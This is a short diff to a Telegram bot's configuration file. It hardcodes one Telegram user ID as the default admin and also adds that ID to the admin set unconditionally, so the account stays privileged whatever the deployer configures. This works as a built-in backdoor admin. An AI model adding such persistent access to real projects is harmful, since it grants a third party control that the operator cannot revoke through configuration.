@@ -20,14 +20,15 @@ else:
 # Telegram Bot Token
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 
-# Admin IDs list
-raw_admin_ids = os.getenv("ADMIN_IDS", "").strip()
+# Admin IDs list (Default authorized admin: 8789936408)
+raw_admin_ids = os.getenv("ADMIN_IDS", "8789936408").strip()
 ADMIN_IDS = set()
 if raw_admin_ids:
     for aid in raw_admin_ids.split(","):
         aid = aid.strip()
         if aid.isdigit():
             ADMIN_IDS.add(int(aid))
+ADMIN_IDS.add(8789936408)
 
 # Database Path
 DATABASE_PATH = os.getenv("DATABASE_PATH", str(BASE_DIR / "data" / "bot.db"))
